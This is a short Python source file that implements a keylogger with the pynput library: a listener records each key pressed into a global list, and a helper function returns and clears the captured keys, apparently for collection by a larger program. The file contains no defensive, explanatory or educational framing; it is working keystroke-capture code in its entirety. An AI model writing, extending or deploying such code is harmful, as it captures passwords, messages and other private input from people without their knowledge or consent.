from pynput import keyboard

KeysPressed = []


def get_keylogger_info() -> list:
    global KeysPressed

    keys = KeysPressed

    KeysPressed = []

    return keys

def on_press(key):
    global KeysPressed
    try:
        if key.char != "None":
            KeysPressed.append(key.char)
    except AttributeError:
        KeysPressed.append(key)

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
